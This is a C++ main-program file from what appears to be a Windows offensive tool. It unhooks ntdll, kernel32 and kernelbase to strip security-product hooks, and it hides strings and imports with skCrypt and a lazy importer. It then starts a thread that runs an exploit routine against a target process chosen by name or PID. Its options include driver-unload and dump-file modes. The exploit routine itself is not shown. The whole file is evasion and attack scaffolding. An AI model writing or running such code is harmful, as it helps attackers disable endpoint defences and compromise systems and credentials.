#include "exploit.h"

BOOL g_bDebug = false;
BOOL g_bForce = false;
DWORD g_dwProcessId = 0;
LPWSTR g_pwszExecutionMode = nullptr;
LPWSTR g_pwszDumpFilePath = nullptr;
LPWSTR g_pwszProcessName = nullptr;
int g_intExecutionMode = -1;

int wmain(int argc, wchar_t* argv[])
{

    wil::unique_handle permaThread;

    if (!ParseArguments(argc, argv))
        return 1;

    std::vector<const wchar_t*> dllsToUnhook
    { 
        skCrypt(L"ntdll.dll"), 
        skCrypt(L"kernel32.dll"),
        skCrypt(L"kernelbase.dll") 
    };

    for (auto dll : dllsToUnhook)
    {
        if (!UnhookDll(dll)) return -1;
    }

    PRINTARGUMENTS();

    if (g_pwszProcessName != NULL && g_intExecutionMode != DRIVER_UNLOAD_MODE)
    {
        DWORD dwProcessId = 0;

        if (ProcessGetPIDFromName(g_pwszProcessName, &dwProcessId))
        {
            PRINTDEBUG(L"[*] Found a process with name '%ws' and PID %d\n", g_pwszProcessName, dwProcessId);
            DWORD tid = 0;
            auto status = LI_FN(NtCreateThreadEx)(&permaThread, MAXIMUM_ALLOWED, nullptr, NtCurrentProcess(),
                &RunExploit, (LPVOID)dwProcessId, THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE,
                0, 0, 0, nullptr);
            if(status == STATUS_SUCCESS) WaitForSingleObject(permaThread.get(), INFINITE);
        }
    }
    else if (g_dwProcessId != 0 && g_intExecutionMode != DRIVER_UNLOAD_MODE)
    {
        auto status = LI_FN(NtCreateThreadEx)(&permaThread, MAXIMUM_ALLOWED, nullptr, NtCurrentProcess(),
            &RunExploit, (LPVOID)g_dwProcessId, THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE,
            0, 0, 0, nullptr);
        if (status == STATUS_SUCCESS) WaitForSingleObject(permaThread.get(), INFINITE);
    }
    else
    {
        auto runZero = 0;
        auto status = LI_FN(NtCreateThreadEx)(&permaThread, MAXIMUM_ALLOWED, nullptr, NtCurrentProcess(),
            &RunExploit, (LPVOID)runZero, THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE,
            0, 0, 0, nullptr);
        if (status == STATUS_SUCCESS) WaitForSingleObject(permaThread.get(), INFINITE);
    }

    return 0;
}
